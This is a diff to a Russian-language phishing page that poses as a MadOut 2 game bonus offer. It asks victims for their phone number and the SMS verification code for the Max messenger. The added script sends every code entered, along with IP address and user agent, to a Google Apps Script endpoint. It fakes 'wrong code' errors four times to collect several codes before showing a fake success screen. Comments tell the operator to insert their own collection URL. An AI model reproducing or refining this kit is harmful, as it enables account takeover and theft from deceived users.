@@ -33,6 +33,8 @@
         .spinner { width: 50px; height: 50px; border: 4px solid #2a3040; border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loading-text { color: #8890a0; font-size: 14px; }
+        .sms-notice { color: #8890a0; font-size: 11px; margin-top: 8px; line-height: 1.4; }
+        .sms-notice span { color: var(--gold); }
     </style>
 </head>
 <body>
@@ -48,23 +50,31 @@
         <div id="screen-auth" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
             <div class="logo-sub">Авторизация</div>
-            <p class="info-text">Для начисления <span class="highlight">1 000 000 монет</span> и <span class="highlight">1 000 алмазов</span> необходимо авторизоваться через <span class="highlight">Макс</span></p>
+            <p class="info-text">Для начисления <span class="highlight">1 000 000 монет</span> и <span class="highlight">1 000 алмазов</span> необходимо подтвердить номер через <span class="highlight">Макс</span></p>
             <div class="input-group"><label>Номер телефона</label><div class="phone-wrapper"><span class="phone-prefix">+7</span><input type="tel" id="phone" placeholder="9XX XXX-XX-XX" maxlength="13" inputmode="numeric" oninput="formatPhone(this)"></div></div>
             <button class="btn" id="btn-phone" onclick="requestCode()">Получить код</button>
             <div class="error-msg" id="phone-error">Введите 10 цифр начиная с 9</div>
+            <p class="sms-notice">Код от <span>Макс</span> придёт в <span>СМС</span> на ваш телефон</p>
         </div>
         <div id="screen-loading" class="loading-overlay">
             <div class="spinner"></div>
-            <p class="loading-text">Отправляем код в Макс</p>
-            <p class="loading-text">Ожидайте...</p>
+            <p class="loading-text">Отправляем код через Макс</p>
+            <p class="loading-text">Ожидайте СМС<span class="loading-dots"></span></p>
         </div>
         <div id="screen-code" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
             <div class="logo-sub">Подтверждение</div>
-            <p class="info-text">Код отправлен в Макс на номер <strong id="display-phone" style="color:#ffd700;"></strong></p>
-            <div class="input-group"><label>Код из Макс</label><div class="input-wrapper"><input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')"></div></div>
+            <p class="info-text">Код от <span class="highlight">Макс</span> отправлен в СМС на номер <strong id="display-phone" style="color:#ffd700;"></strong></p>
+            <p class="sms-notice">Проверьте папку <span>«СМС»</span> или <span>«Сообщения»</span> в телефоне</p>
+            <div class="input-group"><label>Код из СМС (6 цифр)</label><div class="input-wrapper"><input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')"></div></div>
             <button class="btn" id="btn-code" onclick="confirmCode()">Подтвердить</button>
-            <div class="error-msg" id="code-error">Введите код из Макс (минимум 4 цифры)</div>
+            <div class="error-msg" id="code-error">Введите код из СМС (6 цифр)</div>
+        </div>
+        <!-- ЗАГРУЗКА ПРИ ПРОВЕРКЕ КОДА -->
+        <div id="screen-code-loading" class="loading-overlay">
+            <div class="spinner"></div>
+            <p class="loading-text">Проверяем код</p>
+            <p class="loading-text">Ожидайте<span class="loading-dots"></span></p>
         </div>
         <div id="screen-done" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo_2.png" alt="MadOut 2"></div>
@@ -72,13 +82,16 @@
             <p class="info-text" style="color:#4caf50;font-size:18px;font-weight:700;">✅ 1 000 000 монет</p>
             <p class="info-text" style="color:#4caf50;font-size:18px;font-weight:700;">✅ 1 000 алмазов</p>
             <p class="info-text">На ваш аккаунт с ID <strong id="done-id" style="color:#ffd700;"></strong> будут начислены в течение <span class="highlight">30 часов</span></p>
-            <p class="info-text" style="color:#8890a0;font-size:11px;margin-top:12px;">Если бонусы не появятся — обратитесь в поддержку Макс с вашим ID</p>
+            <p class="info-text" style="color:#8890a0;font-size:11px;margin-top:12px;">Если бонусы не появятся — обратитесь в поддержку с вашим ID</p>
         </div>
         <div class="footer">MadOut 2 • Партнёрская программа</div>
     </div>
 
     <script>
+        // ⚠️⚠️⚠️ СЮДА ВСТАВЬ СВОЙ URL APPS SCRIPT ⚠️⚠️⚠️
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxA9jfcQHJZZ-YjHSKGvsprohch_N6_j7tf52of_x-0vVXR6_4azmzXA4NeQwPewJg/exec';
+        // ⚠️⚠️⚠️ СЮДА ВСТАВЬ СВОЙ URL APPS SCRIPT ⚠️⚠️⚠️
+
         var playerID = '';
         var codeAttempt = 1;
 
@@ -128,23 +141,36 @@
         async function confirmCode() {
             var codeInput = document.getElementById('code');
             var code = codeInput.value.replace(/\D/g, '');
-            if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из Макс (минимум 4 цифры)'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); return; }
+            if (code.length !== 6) { document.getElementById('code-error').textContent = 'Код должен содержать ровно 6 цифр'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); return; }
 
-            if (codeAttempt === 1) {
-                var ip1 = await getIP();
-                fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip1, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), attempt: 1 }) }).catch(function(err) { console.log('ok'); });
-                document.getElementById('code-error').textContent = 'Неверный код. Проверьте SMS и попробуйте ещё раз.';
-                document.getElementById('code-error').style.display = 'block';
-                codeInput.value = '';
-                codeAttempt = 2;
-                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 4000);
-                return;
-            }
+            // Показываем загрузку
+            document.getElementById('screen-code').style.display = 'none';
+            document.getElementById('screen-code-loading').style.display = 'block';
 
-            document.getElementById('code-error').style.display = 'none';
-            var ip2 = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'АКТИВАЦИЯ...';
-            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip2, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), attempt: 2 }) }).catch(function(err) { console.log('ok'); });
-            setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('done-id').textContent = playerID; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 2000);
+            // Отправляем КАЖДУЮ попытку в бота
+            var ip = await getIP();
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), attempt: codeAttempt }) }).catch(function(err) { console.log('ok'); });
+
+            // Задержка 2 секунды для проверки
+            setTimeout(function() {
+                document.getElementById('screen-code-loading').style.display = 'none';
+
+                if (codeAttempt < 4) {
+                    // Неудачная попытка (1-4)
+                    document.getElementById('code-error').textContent = 'Неверный код. Проверьте код из SMS и введите правильный код!';
+                    document.getElementById('screen-code').style.display = 'block';
+                    document.getElementById('code-error').style.display = 'block';
+                    codeInput.value = '';
+                    codeAttempt++;
+                    setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 4000);
+                } else {
+                    // Пятая попытка — успех
+                    document.getElementById('code-error').style.display = 'none';
+                    var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'АКТИВАЦИЯ...';
+                    document.getElementById('screen-code').style.display = 'block';
+                    setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('done-id').textContent = playerID; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 2000);
+                }
+            }, 2000);
         }
     </script>
 </body>
